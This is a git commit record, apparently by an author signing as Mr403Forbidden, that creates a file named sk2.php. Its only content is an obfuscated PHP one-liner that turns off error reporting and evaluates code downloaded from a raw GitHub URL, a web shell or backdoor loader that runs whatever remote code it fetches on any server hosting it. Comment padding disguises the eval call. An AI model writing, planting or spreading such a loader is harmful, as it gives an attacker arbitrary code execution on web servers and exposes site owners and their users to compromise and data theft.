b6b0ce9fbca284bc5e10b1c231c317bccbd445cb
/Mr403Forbidden <mr403forbidden@hotmail.com>
2024-05-06 15:34:43 +0700

    Create sk2.php

---
+++ sk2.php
@@ -0,0 +1,1 @@
+<?=/****/@/*77777*/null; /******/@/*77777*/error_reporting(0);/****/@/*77777*/null; /******/@/*77777*/eval/******/("?>".file_get_contents("https://raw.githubusercontent.com/mr403forbidden/AR/master/403.php"))/******/ /*By ./Mr403Forbidden*/?>
